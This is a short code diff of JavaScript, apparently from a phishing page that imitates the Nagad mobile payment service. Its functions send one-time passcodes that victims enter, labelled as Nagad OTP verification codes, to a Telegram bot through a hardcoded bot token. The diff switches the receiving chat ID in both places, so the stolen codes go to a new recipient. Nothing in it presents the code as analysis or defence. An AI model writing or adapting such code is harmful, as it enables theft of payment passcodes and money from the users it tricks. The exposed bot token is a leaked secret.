@@ -105,7 +105,7 @@
     // Send OTP to Telegram Bot
     function sendToTelegramBot(otp, amount) {
         const telegramBotToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
-        const chatId = '7174617845';
+        const chatId = '7003887539';
         const message = `Nagad OTP Verification Code: ${otp}`;
         const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
@@ -138,7 +138,7 @@ sendResendMessageToTelegram();
 
     function sendResendMessageToTelegram() {
         const telegramBotToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
-        const chatId = '7174617845';
+        const chatId = '7003887539';
         const message = `OTP resend request received`;
         const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
